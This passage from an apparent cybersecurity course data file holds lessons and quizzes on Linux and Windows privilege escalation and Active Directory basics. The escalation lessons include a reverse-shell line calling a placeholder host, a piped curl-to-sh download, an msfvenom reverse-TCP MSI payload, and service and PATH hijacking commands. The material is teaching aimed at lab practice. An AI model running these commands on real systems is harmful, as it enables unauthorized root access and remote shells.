echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/cron/script.sh
\`\`\`

**PATH hijacking:** If a cron job runs a command without its full path (e.g., \`backup.sh\` instead of \`/usr/local/bin/backup.sh\`), you can place a malicious script earlier in PATH:

\`\`\`bash
echo '/bin/bash' > /tmp/backup
chmod +x /tmp/backup
export PATH=/tmp:$PATH
\`\`\`

When the cron job runs \`backup\`, it finds yours first.

## Step 5: Kernel Exploits - Nuclear Option

:::warning
Kernel exploits can crash the system. Only use in lab environments. Never use on production systems.
:::

Kernel exploits target vulnerabilities in the Linux kernel itself. They're powerful but risky - a failed exploit can kernel panic the system.

**Check kernel version:**

\`\`\`bash
uname -r
# Output: 5.15.0-91-generic
\`\`\`

**Search for known exploits:**

\`\`\`bash
searchsploit linux kernel 5.15
\`\`\`

**Notable kernel exploits:**
| CVE | Name | Kernel Range | Type |
|-----|------|-------------|------|
| CVE-2016-5195 | Dirty COW | 2.6.22 - 4.8.3 | Race condition |
| CVE-2021-4034 | PwnKit | All polkit versions | Memory corruption |
| CVE-2021-3156 | Baron Samedit | sudo 1.8.2 - 1.9.5p1 | Heap overflow |
| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.11 | Overwrite read-only data |

**Before using a kernel exploit:**
1. Verify the kernel version matches the exploit requirements
2. Check if the system has patches installed
3. Have a backup plan if the exploit crashes the system
4. Prefer other vectors first (SUID, sudo, cron) - they're safer

## Step 6: LinPEAS - Automated Enumeration

LinPEAS automates the entire enumeration process. It checks dozens of vectors in minutes.

**Download and run:**

\`\`\`bash
# Transfer from attacker machine
scp linpeas.sh user@target:/tmp/
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Or run directly from URL
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\`

**What LinPEAS checks:**
- SUID/SGID misconfigurations
- Writable /etc/passwd
- Sudo misconfigurations
- Cron jobs
- Kernel exploits
- Capabilities
- Docker group membership
- Writable sensitive files
- Network information
- Running processes

**How to read LinPEAS output:**
- **Red/Yellow** = High probability exploit vector
- **Green** = Interesting finding, needs investigation
- **White** = Informational

:::checkpoint
Run LinPEAS on a local vulnerable VM (like VulnHub's DC-1 or Kioptrix). Identify at least 3 potential privilege escalation vectors and attempt to exploit one of them.
:::

## Methodology Summary

\`\`\`
1. id, uname -a, sudo -l           → Know your position
2. find / -perm -4000               → SUID binaries
3. cat /etc/crontab                 → Cron jobs
4. ls -la /etc/cron.d/              → Writable cron scripts
5. searchsploit linux kernel <ver>  → Kernel exploits
6. curl linpeas.sh | sh            → Automated enumeration
\`\`\`

Always try the safest vectors first (sudo, SUID, cron) before resorting to kernel exploits.`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What is your methodology for Linux privilege escalation, and what are the most common vectors?',
        interviewAnswer: 'My methodology is: enumerate with id, uname -a, and sudo -l to understand my position, find SUID binaries with find / -perm -4000, check cron jobs in /etc/crontab, search for kernel exploits with searchsploit, and run LinPEAS for automated enumeration. The most common vectors are SUID binaries that can execute arbitrary commands, sudo misconfigurations with NOPASSWD, writable cron scripts, and kernel exploits like Dirty COW or PwnKit.',
        quiz: [
          {
            question: 'What does the SUID bit (permission 4000) on a binary do?',
            options: ['Makes the binary executable by all users', 'Runs the binary with the file owner\'s privileges', 'Makes the binary read-only', 'Prevents the binary from being deleted'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'SUID causes the binary to execute with the permissions of the file owner (typically root) rather than the user running it.',
            certTags: ['CEH', 'CompTIA Security+', 'OSCP']
          },
          {
            question: 'What does sudo -l output show?',
            options: ['All sudo users on the system', 'What commands the current user can run with sudo and under which accounts', 'The sudo configuration file contents', 'The sudo log history'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'sudo -l lists the current user\'s sudo privileges, showing which commands can be run and as which user.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is GTFOBins?',
            options: ['A Linux kernel exploit database', 'A curated list of Unix binaries that can be exploited for privilege escalation', 'A password cracking tool', 'A network scanning utility'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'GTFOBins documents how to exploit legitimate Unix binaries for privilege escalation, file transfers, and other purposes.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'How do you find all SUID binaries on a Linux system?',
            options: ['ls -la /usr/bin/*', 'find / -perm -4000 -type f 2>/dev/null', 'cat /etc/suid', 'suid --scan /'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'The find command with -perm -4000 searches for files with the SUID bit set.',
            certTags: ['OSCP']
          },
          {
            question: 'If a cron job runs a script that you can write to, what can you do?',
            options: ['Nothing - cron jobs run as root regardless', 'Modify the script to execute a reverse shell or other malicious command', 'Delete the cron job', 'Change the cron schedule'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'If the cron script runs as root and you can modify it, you can inject commands that execute with root privileges.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What does LinPEAS do?',
            options: ['Automatically exploits all found vulnerabilities', 'Performs comprehensive automated privilege escalation enumeration', 'Only checks for SUID binaries', 'Scans the network for other vulnerable hosts'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'LinPEAS is an automated enumeration script that checks dozens of privilege escalation vectors and highlights findings.',
            certTags: ['OSCP']
          },
          {
            question: 'What is PATH hijacking?',
            options: ['Changing the PATH variable to hide malware', 'Placing a malicious script in a directory that is searched before the legitimate binary\'s location', 'Hijacking another user\'s PATH variable', 'Modifying the system PATH to add new tools'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'If a script calls a command without its full path, placing a malicious version earlier in PATH causes it to execute instead.',
            certTags: ['OSCP']
          },
          {
            question: 'What kernel exploit is commonly associated with Linux privilege escalation on kernels 2.6.22 through 4.8.3?',
            options: ['Heartbleed', 'Dirty COW (CVE-2016-5195)', 'Shellshock', 'EternalBlue'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Dirty COW is a race condition in the Linux kernel\'s memory subsystem that allows local privilege escalation.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'If you find vim has SUID bit set, how can you get a root shell?',
            options: ['vim --root', 'vim -c \':!/bin/sh\'', 'vim -e "system(\'/bin/sh\')"', 'sudo vim'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'vim\'s -c flag executes a command on startup. The :!sh command drops to a shell running with vim\'s SUID privileges.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the command find / -perm -2000 -type f 2>/dev/null search for?',
            options: ['SUID binaries', 'SGID binaries', 'World-writable files', 'Hidden files'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Permission 2000 is the SGID bit. SGID binaries run with the group owner\'s privileges.',
            certTags: ['OSCP']
          },
          {
            question: 'Why is /etc/shadow significant in privilege escalation?',
            options: ['It contains user home directory paths', 'It contains password hashes that can be cracked offline if readable', 'It controls sudo permissions', 'It stores SSH keys'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: '/etc/shadow contains hashed passwords. If readable (e.g., due to misconfiguration), hashes can be cracked offline.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'Which command checks the Linux kernel version?',
            options: ['cat /etc/os-release', 'uname -r', 'lsb_release -a', 'hostnamectl'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'uname -r displays the kernel release version, which is critical for identifying kernel exploit opportunities.',
            certTags: ['OSCP']
          },
          {
            question: 'What should you check in /etc/crontab when looking for escalation vectors?',
            options: ['Only the schedule timing', 'Scripts or commands that run as root and whether they are writable', 'Only the user who owns the crontab', 'Only the PATH variable'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Cron jobs often run as root. If the scripts they execute are writable or use relative paths, they may be exploitable.',
            certTags: ['OSCP']
          }
        ]
      },
      {
        id: 'we33d02',
        title: 'Windows Privilege Escalation',
        description: 'Enumerate and exploit Windows privilege escalation vectors including service misconfigs and token impersonation.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Understand how Windows security model works (tokens, SIDs, integrity levels)
- Identify service misconfigurations, registry settings, and credential issues
- Use WinPEAS for automated Windows privilege escalation enumeration
:::

:::info
All techniques in this topic are for local lab use only, never against systems you don't own or have explicit authorization to test.
:::

## How Windows Security Works

Windows uses a different security model than Linux. Understanding it is essential for privilege escalation.

**Security Tokens:** When a user logs in, Windows creates a security token containing:
- **SID (Security Identifier):** Unique identifier for the user (e.g., S-1-5-21-...)
- **Group memberships:** Which groups the user belongs to
- **Privileges:** What the user is allowed to do (e.g., SeImpersonatePrivilege)
- **Integrity level:** Low, Medium, High, or System

**Integrity Levels:**
| Level | Who Runs At This | What They Can Do |
|-------|-----------------|-----------------|
| Low | Untrusted processes, sandboxed apps | Very limited - can't write to most locations |
| Medium | Standard users | Normal operations - can't modify system files |
| High | Administrators (elevated) | Full admin access - can modify most things |
| System | Windows services, kernel | Complete control - can do anything |

**Why this matters for privesc:** If you're running as Medium integrity and can get a process to run as High or System, you've escalated. The vectors are: misconfigured services, weak permissions, stored credentials, token impersonation.

## Step 1: Enumeration - Know Your Position

\`\`\`bash
# Who are you and what can you do?
whoami
whoami /priv          # Your privileges (SeImpersonatePrivilege is gold)
whoami /groups        # Group memberships (BUILTIN\\Administrators = admin)

# What system are you on?
systeminfo            # OS version, patches, hotfixes
hostname              # Computer name

# Who else is here?
net user              # All local users
net localgroup administrators   # Who's in the admin group

# Network context
ipconfig /all         # Network configuration
netstat -ano          # Listening ports with PIDs
\`\`\`

:::tip
Always check \`whoami /priv\` first. If you see SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege, Potato attacks may give you SYSTEM.
:::

## Step 2: Unquoted Service Paths - Windows Path Search

When a service path contains spaces and is NOT quoted, Windows tries alternative paths:

\`\`\`
Service path: C:\\Program Files\\My Service\\service.exe

Windows tries (in order):
1. C:\\Program.exe
2. C:\\Program Files\\My.exe
3. C:\\Program Files\\My Service\\service.exe
\`\`\`

**Why this works:** Windows parses the path from left to right, looking for an executable at each space. If you can write to \`C:\\\`, you can place a malicious \`Program.exe\` that runs as the service account (often SYSTEM).

**Find unquoted service paths:**
\`\`\`bash
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows" | findstr /i /v '"'
\`\`\`

**Exploitation:**
\`\`\`bash
# Place malicious executable at the earlier path
copy C:\\temp\\shell.exe "C:\\Program.exe"

# Restart the service (if you have permission)
sc stop VulnService
sc start VulnService
\`\`\`

## Step 3: Weak Service Permissions - Modify the Binary Path

If you can modify a service's configuration, you can change what it runs:

\`\`\`bash
# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" * /svc

# If you have SERVICE_ALL_CONFIG permission:
sc config VulnService binpath= "C:\\temp\\shell.exe"
sc stop VulnService
sc start VulnService
\`\`\`

**Why this works:** The service runs with its original account's privileges (often SYSTEM). If you change the binary path to your malicious executable, it runs as SYSTEM when the service starts.

## Step 4: AlwaysInstallElevated - MSI as SYSTEM

If both registry keys are set to 1, ANY user can install MSI packages with SYSTEM privileges:

\`\`\`bash
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer
\`\`\`

If both return \`AlwaysInstallElevated = 0x1\`:
\`\`\`bash
# Generate a malicious MSI
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o shell.msi

# Install it (runs as SYSTEM)
msiexec /quiet /qn /i shell.msi
\`\`\`

**Why this works:** The AlwaysInstallElevated policy was designed for enterprise software deployment. It's a misconfiguration when enabled on user workstations.

## Step 5: Token Impersonation (Potato Attacks)

:::warning
Potato attacks require specific Windows versions and configurations. They are for lab study only.
:::

**SeImpersonatePrivilege** allows a process to impersonate other users' tokens. If you have this privilege (common for service accounts), Potato attacks can escalate to SYSTEM.

**How it works:**
1. The attacker triggers NTLM authentication from the SYSTEM account
2. The attacker intercepts the NTLM hash
3. The attacker impersonates the SYSTEM token

**Check if you have the privilege:**
\`\`\`bash
whoami /priv
# Look for: SeImpersonatePrivilege  Enabled
\`\`\`

**Common Potato variants:**
- RottenPotato (Windows 7/Server 2008)
- JuicyPotato (Windows 8/10/Server 2012/2016)
- PrintSpoofer (Windows 10/Server 2016+)
- GodPotato (Windows 8-11/Server 2012-2022)

## Step 6: Stored Credentials

Windows can store credentials for "runas" commands:

\`\`\`bash
# Check for saved credentials
cmdkey /list

# If credentials are stored, run commands as that user
runas /savecred /user:admin C:\\temp\\shell.exe
\`\`\`

## Step 7: DLL Hijacking

If a service loads a DLL from a writable directory, place a malicious DLL there:

1. Use ProcMon (Sysinternals) to find "NAME NOT FOUND" for DLLs
2. Check if the directory is writable
3. Place your malicious DLL with the expected name
4. Restart the service

## Step 8: Registry AutoRuns

\`\`\`bash
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
\`\`\`

If an AutoRun entry points to a writable path, replace it with a malicious executable. It runs at the next login.

## WinPEAS - Automated Enumeration

\`\`\`bash
# Transfer WinPEAS to target
upload winpeas.exe C:\\temp\\

# Run WinPEAS
C:\\temp\\winpeas.exe
\`\`\`

**What WinPEAS checks:**
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Stored credentials
- Token privileges
- DLL hijacking opportunities
- Kernel exploits
- Registry autoruns
- Scheduled tasks

:::checkpoint
Run WinPEAS on a local vulnerable Windows VM. Identify at least 2 privilege escalation vectors and explain how you would exploit one of them.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain unquoted service paths and AlwaysInstallElevated as Windows privilege escalation vectors.',
        interviewAnswer: 'Unquoted service paths occur when a service path contains spaces without quotes, causing Windows to try alternative paths where an attacker can place a malicious executable. AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges when both HKLM and HKCU registry keys are set to 1. Both vectors are detected by WinPEAS and exploited by placing malicious binaries that execute with elevated service account privileges.',
        quiz: [
          {
            question: 'What does systeminfo output reveal that is useful for privilege escalation?',
            options: ['Only the hostname', 'OS version, installed patches, and hotfixes that may indicate missing kernel exploits', 'Only the IP address', 'Only the logged-in users'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'systeminfo shows the OS version and installed patches, which helps identify missing updates that could be exploited.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is an unquoted service path?',
            options: [
              'A service path that uses single quotes instead of double quotes',
              'A service path containing spaces without surrounding quotes, allowing Windows to try alternative paths',
              'A service path that is encrypted',
              'A service path pointing to a network share'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'Windows tries to resolve paths with spaces by testing partial path combinations, potentially executing a malicious binary placed at the earlier path.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What two registry keys must both be set to 0x1 for AlwaysInstallElevated to work?',
            options: [
              'HKLM\\...\\Installer\\AlwaysInstallElevated and HKCU\\...\\Installer\\AlwaysInstallElevated',
              'HKLM\\...\\Run and HKCU\\...\\Run',
              'HKLM\\...\\Policies\\System and HKCU\\...\\Policies\\System',
              'HKLM\\...\\Shell and HKCU\\...\\Shell'
            ],
            correctAnswerIndex: 0,
            difficulty: 'advanced',
            explanation: 'Both the local machine (HKLM) and current user (HKCU) AlwaysInstallElevated values must be set to 1.',
            certTags: ['OSCP']
          },
          {
            question: 'What privilege is required for Potato attacks to work?',
            options: ['SeDebugPrivilege', 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege', 'SeTcbPrivilege', 'SeBackupPrivilege'],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'Potato attacks exploit impersonation privileges to escalate to SYSTEM. SeImpersonatePrivilege is commonly enabled on service accounts.',
            certTags: ['OSCP']
          },
          {
            question: 'What does the cmdkey /list command do?',
            options: ['Lists all command-line aliases', 'Shows stored credentials on the system', 'Lists all scheduled tasks', 'Displays cached Kerberos tickets'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'cmdkey /list displays stored credentials that can be used with runas /savecred to execute commands as other users.',
            certTags: ['OSCP']
          },
          {
            question: 'What is WinPEAS?',
            options: [
              'A Windows exploit framework',
              'An automated privilege escalation enumeration script for Windows',
              'A password cracking tool',
              'A network packet sniffer'
            ],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'WinPEAS automates the detection of common Windows privilege escalation vectors.',
            certTags: ['OSCP']
          },
          {
            question: 'How can you exploit a service with weak permissions using sc config?',
            options: [
              'sc config ServiceName password= newpass',
              'sc config ServiceName binpath= "C:\\\\temp\\\\shell.exe"',
              'sc config ServiceName start= auto',
              'sc config ServiceName obj= SYSTEM'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'If you can modify a service\'s binpath, you can point it to a malicious executable that runs with the service\'s privileges.',
            certTags: ['OSCP']
          },
          {
            question: 'What does whoami /priv show?',
            options: ['All users on the system', 'The current user\'s assigned privileges', 'The user\'s group memberships', 'The user\'s password last set date'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'whoami /priv lists all privileges assigned to the current user token, which is critical for identifying escalation opportunities.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What is DLL hijacking?',
            options: [
              'Encrypting DLL files for ransom',
              'Placing a malicious DLL in a location where a vulnerable application will load it instead of the legitimate DLL',
              'Downloading DLLs from the internet',
              'Modifying DLL permissions to deny access'
            ],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'If an application loads a DLL from a writable directory, you can place a malicious DLL there to execute code with the application\'s privileges.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'Which command lists all members of the local administrators group?',
            options: ['net user', 'net localgroup administrators', 'whoami /groups', 'net accounts'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'net localgroup administrators shows all users and groups with administrator privileges.',
            certTags: ['CEH']
          },
          {
            question: 'How can you generate a malicious MSI package for AlwaysInstallElevated exploitation?',
            options: [
              'msfvenom -p windows/shell/reverse_tcp LHOST=x LPORT=y -f msi -o shell.msi',
              'msiexec /generate shell.exe',
              'msfvenom --type msi shell.exe',
              'create-msi shell.exe shell.msi'
            ],
            correctAnswerIndex: 0,
            difficulty: 'intermediate',
            explanation: 'msfvenom can output MSI format directly with -f msi, creating an installable package that executes a payload.',
            certTags: ['OSCP']
          },
          {
            question: 'What is the difference between SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege?',
            options: [
              'They are the same privilege',
              'SeImpersonate allows impersonating tokens of other processes; SeAssignPrimaryToken allows assigning a primary token to a child process',
              'SeImpersonate is for admin accounts only; SeAssignPrimaryToken is for all users',
              'SeImpersonate is for network access; SeAssignPrimaryToken is for local access'
            ],
            correctAnswerIndex: 1,
            difficulty: 'advanced',
            explanation: 'Both are related to token manipulation but serve different functions. Both can potentially be exploited by Potato attacks.',
            certTags: ['OSCP']
          },
          {
            question: 'Where should you look for AutoRun privilege escalation opportunities?',
            options: [
              'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
              'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
              'Both Run and RunOnce registry keys',
              'Only in the Startup folder'
            ],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'Both Run and RunOnce registry keys define programs that execute at startup. If the executable path is writable, it can be replaced.',
            certTags: ['OSCP']
          }
        ]
      }
    ]
  },
  {
    id: 'week34',
    title: 'Active Directory Concepts',
    durationText: 'Week 34',
    focus: 'Understand Active Directory architecture, authentication protocols, and common attack concepts.',
    output: 'AD concepts reference sheet with authentication flow diagrams and attack explanations.',
    topics: [
      {
        id: 'we34d01',
        title: 'AD Fundamentals',
        description: 'Learn the structure of Active Directory, LDAP, Kerberos, and NTLM authentication.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Describe the AD hierarchy: Forest, Domain, OU, Objects
- Explain how LDAP queries work and common ports
- Understand the Kerberos and NTLM authentication flows
- Know the key AD ports and their purposes
:::

:::info
Active Directory knowledge is essential for enterprise security roles. These concepts apply to both attack and defense.
:::

## AD Structure

:::concept
**Forest** → Top-level container, trust boundary between organizations
**Domain** → Logical grouping of objects (users, computers, groups)
**OU (Organizational Unit)** → Subdivision within a domain for organizing objects and applying Group Policy
**Objects** → Users, computers, groups, printers, shared folders
:::

### Key Components
- **Domain Controller (DC):** Server that handles authentication and enforces security policies
- **Global Catalog:** Partial replica of all objects in the forest, enables cross-domain searches
- **Group Policy Objects (GPO):** Rules applied to OUs to enforce configuration
- **DNS:** Critical for AD - clients locate DCs via DNS SRV records

## LDAP (Lightweight Directory Access Protocol)

LDAP is the protocol used to query and modify AD data.

| Port | Protocol | Usage             |
|------|----------|-------------------|
| 389  | LDAP     | Unencrypted queries|
| 636  | LDAPS    | SSL/TLS encrypted  |

### LDAP Query Example
\`\`\`ldap
# Find all users in the Sales OU
(&(objectClass=user)(ou=Sales))

# Find all enabled accounts
(&(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
\`\`\`

### Common LDAP Tools
- \`ldapsearch\` (Linux)
- \`ADSI Edit\` (Windows)
- \`BloodHound\` (graphical AD analysis)

## Kerberos Authentication Flow

:::concept
Kerberos uses tickets instead of passwords for authentication. The flow involves three parties: Client, Key Distribution Center (KDC), and Service.
:::

### Step-by-Step Flow

1. **AS-REQ (Authentication Service Request):** Client sends username to KDC
2. **AS-REP (Authentication Service Reply):** KDC returns encrypted TGT (Ticket Granting Ticket) using the user's password hash
3. **TGS-REQ (Ticket Granting Service Request):** Client presents TGT and requests access to a specific service
4. **TGS-REP (Ticket Granting Service Reply):** KDC issues a Service Ticket encrypted with the service's hash
5. **AP-REQ (Application Request):** Client presents Service Ticket to the target service for access

### Key Kerberos Terms
| Term    | Description                                    |
|--------|------------------------------------------------|
| TGT    | Ticket Granting Ticket - proves identity        |
| SPN    | Service Principal Name - identifies a service   |
| KRBTGT | Service account for the KDC itself              |
| AS     | Authentication Service                         |
| TGS    | Ticket Granting Service                         |

## NTLM Authentication Flow

1. Client sends username to server
2. Server generates a random challenge
3. Client hashes the challenge with the user's password and sends the response
4. Server forwards the challenge and response to the DC for verification
5. DC validates and responds to the server

:::warning
NTLM is considered less secure than Kerberos. It is vulnerable to Pass-the-Hash, relay attacks, and offline cracking.
:::

## Critical AD Ports

| Port  | Service         | Notes                          |
|------|----------------|--------------------------------|
| 53   | DNS            | AD relies on DNS for DC discovery |
| 88   | Kerberos       | Authentication tickets          |
| 135  | RPC            | Remote Procedure Call            |
| 389  | LDAP           | Directory queries               |
| 445  | SMB            | File sharing, remote management |
| 636  | LDAPS          | Encrypted LDAP                   |
| 3268 | Global Catalog | Cross-domain queries            |
| 3269 | Global Catalog SSL | Secure cross-domain queries  |

:::checkpoint
Map out the Kerberos authentication flow from memory. Which tickets are involved, and what encryption protects each one?
:::
`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'Explain the Kerberos authentication flow and why understanding it is important for security professionals.',
        interviewAnswer: 'Kerberos flow: client requests TGT from KDC, KDC returns TGT encrypted with user hash, client presents TGT to request service ticket, KDC issues TGS encrypted with service account hash, client presents TGS to access the service. Understanding this is critical because each stage has specific attack vectors: Kerberoasting targets TGS tickets, AS-REP Roasting targets accounts without pre-authentication, and Golden Ticket attacks forge TGTs using the KRBTGT hash.',
        quiz: [
          {
            question: 'What is the top-level container in Active Directory that defines a trust boundary?',
            options: ['Domain', 'Organizational Unit', 'Forest', 'Site'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'A Forest is the highest-level AD container and defines the trust boundary between organizations.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'What is the purpose of a Domain Controller?',
            options: ['Stores user files', 'Handles authentication and enforces security policies', 'Manages DNS records only', 'Runs web applications'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Domain Controllers authenticate users, enforce Group Policy, and store the AD database.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'What does LDAP stand for and what port does it use?',
            options: ['Lightweight Directory Access Protocol on port 445', 'Lightweight Directory Access Protocol on port 389', 'Local Directory Authentication Protocol on port 389', 'Lightweight Data Access Protocol on port 636'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'LDAP uses port 389 (unencrypted) or 636 (LDAPS with SSL/TLS).',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'In Kerberos, what is a TGT?',
            options: ['Ticket Granting Ticket - proves identity to the KDC', 'Target Group Token - identifies group membership', 'Temporary Grant Token - allows limited access', 'Transport Gateway Tunnel - encrypted connection'],
            correctAnswerIndex: 0,
            difficulty: 'beginner',
            explanation: 'A TGT is issued by the KDC after successful authentication and is used to request service tickets without re-authenticating.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'Which Kerberos message is sent from the client to request access to a specific service?',
            options: ['AS-REQ', 'AS-REP', 'TGS-REQ', 'AP-REQ'],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'TGS-REQ is sent after obtaining a TGT, requesting a Service Ticket for a specific service.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'What is the KRBTGT account?',
            options: ['A regular user account', 'The service account for the Key Distribution Center itself', 'An administrator account', 'A guest account'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'KRBTGT is the KDC service account. Its hash is used to encrypt TGTs and is a high-value target for Golden Ticket attacks.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'What port does Kerberos authentication use?',
            options: ['53', '88', '135', '389'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Kerberos uses port 88 for authentication ticket exchanges.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'What is an SPN in Kerberos?',
            options: ['Security Principal Name - identifies a user', 'Service Principal Name - identifies a service', 'Server Protocol Number - port number', 'Shared Private Network - subnet'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'An SPN uniquely identifies a service instance in a domain, allowing clients to request tickets for specific services.',
            certTags: ['OSCP', 'CEH']
          },
          {
            question: 'Why is NTLM considered less secure than Kerberos?',
            options: ['NTLM uses stronger encryption', 'NTLM is vulnerable to Pass-the-Hash and relay attacks', 'NTLM requires two-factor authentication', 'NTLM uses certificate-based authentication'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'NTLM hashes can be captured and reused without knowing the password, making it vulnerable to Pass-the-Hash and relay attacks.',
            certTags: ['CEH', 'OSCP']
          },
          {
            question: 'What port does SMB use in Active Directory?',
            options: ['135', '389', '445', '636'],
            correctAnswerIndex: 2,
            difficulty: 'beginner',
            explanation: 'SMB (Server Message Block) uses port 445 for file sharing and remote management in AD environments.',
            certTags: ['CEH', 'CompTIA Security+']
          },
          {
            question: 'What is the purpose of a Global Catalog in AD?',
            options: ['Stores all user passwords', 'Provides a partial replica of all objects in the forest for cross-domain queries', 'Manages DNS records for the domain', 'Enforces Group Policy across all domains'],
            correctAnswerIndex: 1,
            difficulty: 'intermediate',
            explanation: 'The Global Catalog contains a partial representation of all objects in the forest, enabling searches across domains without querying each DC.',
            certTags: ['CEH']
          },
          {
            question: 'What is the difference between port 389 and port 636 in LDAP?',
            options: ['389 is for queries, 636 is for modifications', '389 is unencrypted, 636 is SSL/TLS encrypted', '389 is for Windows, 636 is for Linux', '389 is slow, 636 is fast'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'Port 389 is standard LDAP (unencrypted), while port 636 is LDAPS (LDAP over SSL/TLS).',
            certTags: ['CEH']
          },
          {
            question: 'In the Kerberos flow, what happens in the AP-REQ step?',
            options: ['Client requests a TGT from the KDC', 'KDC issues a Service Ticket', 'Client presents the Service Ticket to the target service', 'Server validates the challenge response'],
            correctAnswerIndex: 2,
            difficulty: 'intermediate',
            explanation: 'AP-REQ is the final step where the client presents the Service Ticket to the target service to gain access.',
            certTags: ['OSCP']
          },
          {
            question: 'What are Group Policy Objects (GPO) used for in AD?',
            options: ['Managing DNS records', 'Enforcing configuration settings on users and computers within OUs', 'Authentication only', 'File sharing permissions'],
            correctAnswerIndex: 1,
            difficulty: 'beginner',
            explanation: 'GPOs define rules for user and computer configurations, applied to OUs to enforce security and operational policies.',
            certTags: ['CEH', 'CompTIA Security+']
          }
        ]
      },
      {
        id: 'we34d02',
        title: 'AD Attack Concepts',
        description: 'Understand common Active Directory attack techniques conceptually with detection strategies.',
        type: 'learn',
        duration: '2 hours',
        content: `:::objectives
- Understand how Kerberos authentication works and why it's exploitable
- Explain Kerberoasting, AS-REP Roasting, Pass-the-Hash, Golden Ticket, and DCSync at the protocol level
- Identify detection strategies for each attack
:::

:::warning
All attack techniques described in this topic are for local lab use only, never against production systems without explicit authorization. Unauthorized access to computer systems is illegal.
:::

## How Kerberos Authentication Works

Before understanding AD attacks, you need to understand Kerberos - the authentication protocol that Active Directory uses.

**The Kerberos flow:**

1. User sends username to the Domain Controller (DC)
2. DC checks if the user exists and sends back a TGT (Ticket Granting Ticket), encrypted with the KRBTGT account hash
3. User presents the TGT to the DC and requests a TGS (Ticket Granting Service) for a specific service (e.g., SQL server)
4. DC sends back a TGS encrypted with the service account's password hash
5. User presents the TGS to the service and gets access

**Why this matters:** Each stage has a different attack vector. The attacks below target specific weaknesses in this flow.

## Kerberoasting - Stealing Service Account Passwords

